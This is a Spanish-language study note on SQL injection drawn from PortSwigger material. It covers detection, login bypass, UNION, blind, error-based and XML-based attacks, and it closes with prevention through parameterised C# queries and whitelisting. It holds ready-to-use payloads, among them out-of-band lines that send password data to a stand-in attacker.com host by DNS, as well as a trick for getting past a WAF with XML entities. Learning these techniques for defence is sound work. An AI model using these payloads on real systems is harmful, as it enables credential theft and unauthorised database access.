---
type: concepto
state: activa
created: 2026-08-15
updated: 2026-08-18
tags: [sql, injection, sqli, portswigger, owasp, dast, sast, oast, error-based, xml]
---

# SQL Injection (SQLi)

> [!info] OWASP Top 10:2025
> **A05:Injection** — SQLi sigue siendo una de las vulnerabilidades web más críticas. Aunque los ORMs la reducen, aparece cuando se concatena SQL o se usa `FromSqlRaw()`. Fuente: PortSwigger Web Security Academy.

## QUÉ es

Vulnerabilidad que permite a un atacante **interferir con las consultas SQL que la aplicación realiza a su base de datos**. Permite:

- Ver datos que normalmente no podría recuperar (datos de otros usuarios, credenciales).
- Modificar o eliminar datos.
- Alterar el comportamiento de la aplicación.

## Impacto de un ataque exitoso

| Consecuencia | Descripción |
|--------------|-------------|
| **Acceso no autorizado a datos sensibles** | Contraseñas, tarjetas de crédito, PII de usuarios |
| **Compromiso total del sistema** | Escalada hasta comprometer el servidor o el back-end |
| **Denegación de Servicio (DoS)** | Bloqueo o caída de la base de datos |
| **Daño reputacional y multas** | Brechas de datos de alto perfil, regulaciones (GDPR, etc.) |
| **Persistencia** | Backdoor que pasa desapercibido por mucho tiempo |

## DÓNDE aparece

```
SELECT ... WHERE user_input ...   ← cláusula WHERE (lo más común)
UPDATE ... SET col = user_input   ← también en UPDATE
INSERT INTO ... VALUES (...)      ← también en INSERT
ORDER BY user_input               ← también en ORDER BY
```

## Detección

### Manual (sistemática, punto de entrada por punto)

1. **Comilla simple `'`** → observar errores o anomalías en la respuesta.
2. **Condiciones lógicas** → `OR 1=1` frente a `OR 1=2` (respuestas distintas = inyectable).
3. **Payloads con retardos de tiempo** → `pg_sleep()`, `SLEEP()`, `WAITFOR DELAY`.
4. **Payloads OAST** → interacciones de red fuera de banda (Burp Collaborator).

### Automática

> [!tip] Burp Scanner
> Herramientas automáticas como **Burp Scanner** encuentran SQLi de forma rápida y confiable. Úsalo como complemento, no como reemplazo de la prueba manual.

## Tipos de ataques

### 1. Recuperación de datos ocultos

Escenario: una tienda filtra productos por categoría. Internamente ejecuta:
```sql
SELECT * FROM products WHERE category = 'Gifts' AND released = 1
```

**Variante 1 — Comentarios:** El atacante comenta la restricción `released`:
```
Input:  Gifts'--
Query:  SELECT * FROM products WHERE category = 'Gifts'--' AND released = 1
        ↑ Solo la categoría se evalúa → muestra productos no publicados
```

**Variante 2 — Lógica booleana:** `OR 1=1` hace la condición siempre verdadera:
```
Input:  ' OR 1=1 --
Query:  SELECT * FROM products WHERE category='' OR 1=1 --' AND released=1
        ↑ Devuelve TODOS los productos sin filtro
```

- **`--`** comenta el resto de la query (anula restricciones).
- **`OR 1=1`** hace la condición siempre verdadera.

### 2. Subversión de la lógica de la aplicación (bypass de login)

```
Input:  administrator'--
Query:  SELECT * FROM users WHERE username='administrator'--' AND password='...'
        ↑ Se comenta la verificación de password → entra sin conocerla
```

### 3. Ataques UNION

Permiten recuperar datos de **otras tablas** añadiendo una segunda query:

```
Input:  ' UNION SELECT username, password FROM users--
Query:  SELECT name, description FROM products WHERE id='' UNION SELECT username, password FROM users--
```

> [!warning] Columnas
> La query original y la de UNION deben devolver el **mismo número de columnas** y tipos compatibles.

**Determinar columnas (procedimiento):**
1. Inyectar `ORDER BY 1--`, `ORDER BY 2--`, `ORDER BY 3--` incrementando hasta recibir error → la anterior es el número de columnas.
2. Alternativa: `UNION SELECT NULL, NULL, NULL...` incrementando `NULL` hasta que la respuesta sea válida.

### 4. Blind SQLi (inyección ciega)

Cuando la app **no devuelve resultados ni errores detallados**. Se explota por:

| Técnica | Mecanismo | Ejemplo |
|---------|-----------|---------|
| **Booleana** | Condición verdadera/falsa produce respuesta distinta | `' AND 1=1--` vs `' AND 1=2--` |
| **Basada en tiempo** | Retardo condicional detecta verdad | `' AND SLEEP(5)--` (MySQL) / `;WAITFOR DELAY '0:0:5'--` (SQL Server) |
| **OAST (out-of-band)** | Exfiltración por canal externo (DNS/HTTP) | `' UNION SELECT load_file('//attacker.dns')` |

#### Respuestas condicionales

Extracción carácter por carácter observando cambios sutiles en la página:
```sql
' AND SUBSTRING((SELECT password FROM users WHERE username='admin'), 1, 1) = 's'--
-- Si aparece "Bienvenido" → la primera letra es 's'
-- Repetir para cada posición: SUBSTRING(..., 2, 1), SUBSTRING(..., 3, 1)...
```

#### Errores condicionales

Si la página no cambia visualmente, se fuerza un error solo cuando la condición es verdadera:
```sql
-- Oracle
' AND (SELECT CASE WHEN (1=1) THEN 1/0 ELSE NULL END FROM dual) IS NULL--
-- Si devuelve Error 500 → condición verdadera
```

#### Retardos de tiempo

```sql
-- MySQL
' AND SLEEP(5)--
-- SQL Server
;WAITFOR DELAY '0:0:5'--
-- PostgreSQL
' AND (SELECT CASE WHEN (1=1) THEN pg_sleep(5) ELSE pg_sleep(0) END) IS NULL--
```

#### Out-of-Band (OAST)

Forzar a la base de datos a realizar una conexión externa para confirmar la vulnerabilidad o exfiltrar datos. Es el método **más fiable** cuando los otros fallan por arquitectura asíncrona.

```sql
-- MSSQL (exfiltración por DNS)
'; exec master..xp_dirtree '//'+(SELECT TOP 1 password FROM users)+'.attacker.com/a'--
-- La BD resuelve S3cure.attacker.com → contraseña = S3cure
```

> [!tip] Ver más
> Técnica completa con canales, sintaxis por motor y herramientas: [[40 - RECURSOS/Conceptos/OAST]]

### 5. Inyección de segundo orden

```
1. El usuario guarda input "seguro" en BD (sin inyectarse al insertar).
2. La app recupera ese dato y lo incorpora en OTRA query insegura.
3. El payload se ejecuta recién ahí → más difícil de detectar por DAST.
```

### 6. Error-based SQLi (Basada en errores)

Aprovecha mensajes de error **detallados (verbose)** para extraer datos directamente del propio mensaje de error:

```sql
' AND 1=CAST((SELECT password FROM users WHERE username='admin') AS int)--
-- Error: "No se puede convertir 'S3cure123' al tipo int" → contraseña filtrada
```

| Característica | Blind SQLi | Error-based SQLi |
|----------------|-----------|------------------|
| **¿Qué ves?** | Nada directo; cambios sutiles o retardos | Mensajes de error del servidor/BD |
| **Canal de datos** | Comportamiento de la app (tiempo/contenido) | El contenido del mensaje de error |
| **Dificultad** | Más lenta (muchas solicitudes) | Rápida si hay errores verbose |
| **Ejemplo** | `' AND SUBSTRING(pass,1,1)='a'--` | `CAST((SELECT password) AS int)` |

### 7. Inyección SQL vía XML

Ocurre cuando la app acepta XML y concatena sus valores directamente en queries SQL:

```xml
<stockCheck>
    <productId>123</productId>
    <storeId>999</storeId>
</stockCheck>
```

```
Input XML:  <storeId>999 &#x53;ELECT * FROM information_schema.tables</storeId>
Decodificado:  999 SELECT * FROM information_schema.tables
```

> [!warning] Evasión de WAF
> El XML permite **ofuscación** con entidades: `&#x53;` = `S`. El WAF no reconoce `SELECT`, pero el servidor decodifica antes de ejecutar SQL.

**Funciones XML en SQL (OAST):**
```sql
-- Oracle: entidades XML externas para exfiltrar datos por DNS
SELECT EXTRACTVALUE(xmltype('<?xml version="1.0"?>
<!DOCTYPE root [<!ENTITY % remote SYSTEM "http://'||user||'.attacker.com/"> %remote;]>'),'/l') FROM dual
```

## Diferencias entre bases de datos

No asumas que el payload funciona igual en todas las plataformas:

| Aspecto | Oracle | MySQL | SQL Server |
|---------|--------|-------|-----------|
| Concatenación | `\|\|` | `CONCAT()` | `+` |
| Comentario | `--` | `--`, `#` | `--` |
| Retardo | `DBMS_LOCK.SLEEP()` / `UTL_INET` | `SLEEP(n)` | `WAITFOR DELAY '0:0:5'` |
| Versión | `v$version` | `@@version` | `@@version` |

> [!warning] Identificar el motor
> Consultar la versión (ej. `v$version` en Oracle) es fundamental para ajustar el payload. El DAST (ej. OWASP ZAP) lo detecta probando fingerprints de cada motor.

## Examinar la BD

**Consultar versión:**

| Motor | Consulta |
|-------|----------|
| Oracle | `SELECT * FROM v$version` |
| MySQL | `SELECT @@version` |
| SQL Server | `SELECT @@version` |
| PostgreSQL | `SELECT version()` |

**Listar tablas y columnas:**

| Motor | Tablas | Columnas |
|-------|--------|----------|
| MySQL / SQL Server | `SELECT * FROM information_schema.tables` | `SELECT * FROM information_schema.columns` |
| Oracle | `SELECT * FROM all_tables` | `SELECT * FROM all_tab_columns` |

## Prevención

### Consultas parametrizadas (sentencias preparadas) — LA defensa principal

> [!tip] Regla de oro
> La entrada del usuario se trata **siempre como dato**, nunca como parte ejecutable de la query. Nunca decidas caso por caso si un dato es "seguro": parametrizá constantemente.

```csharp
// ❌ MAL — concatenación de strings
var query = $"SELECT * FROM Users WHERE Username = '{username}' AND Password = '{password}'";

// ✅ BIEN — LINQ genera SQL parametrizado automáticamente
var user = await context.Users
    .Where(u => u.Username == username && u.Password == password)
    .FirstOrDefaultAsync();

// ✅ BIEN — SQL crudo pero parametrizado
var users = await context.Users
    .FromSqlInterpolated($"SELECT * FROM Users WHERE Username = {username}")
    .ToListAsync();
```

```csharp
// ❌ MAL — FromSqlRaw con interpolación = concatenación disfrazada
var users = await context.Users
    .FromSqlRaw($"SELECT * FROM Users WHERE Username = '{username}'")
    .ToListAsync();
```

### Listas blancas (whitelisting)

Para partes de la query que **no aceptan parámetros** (nombres de tablas, columnas, `ORDER BY`):

```csharp
// ❌ MAL — input directo en ORDER BY (no se puede parametrizar)
var q = $"SELECT * FROM Products ORDER BY {userColumn}";

// ✅ BIEN — validar contra lista de valores permitidos
var allowed = new[] { "Name", "Price", "CreatedAt" };
if (!allowed.Contains(userColumn))
    throw new ArgumentException("Columna no permitida");
var q = $"SELECT * FROM Products ORDER BY {userColumn}";
```

### No confiar en los datos

- Validar todo input en el límite (API/service layer).
- No mostrar errores de BD al usuario (stack traces = info para el atacante → OWASP A09 Logging Failures / errores).
- Principio de mínimo privilegio en la BD (nunca conectarse con `sa`).

## Referencia
- [[40 - RECURSOS/MOCs/MOC - Pentesting]]
- [[MOC - DevSecOps]]
- [[40 - RECURSOS/Conceptos/Injection]]
- [[40 - RECURSOS/Conceptos/OAST]]
- [[20 - PROYECTOS/DevSecOps-Proyecto/Fase-0-Seguridad/Input-Validation]]
- [[40 - RECURSOS/Conceptos/Best-Practices]]
- [PortSwigger — SQL Injection](https://portswigger.net/web-security/sql-injection)

---
#sql #injection #sqli #portswigger #owasp #dast #sast
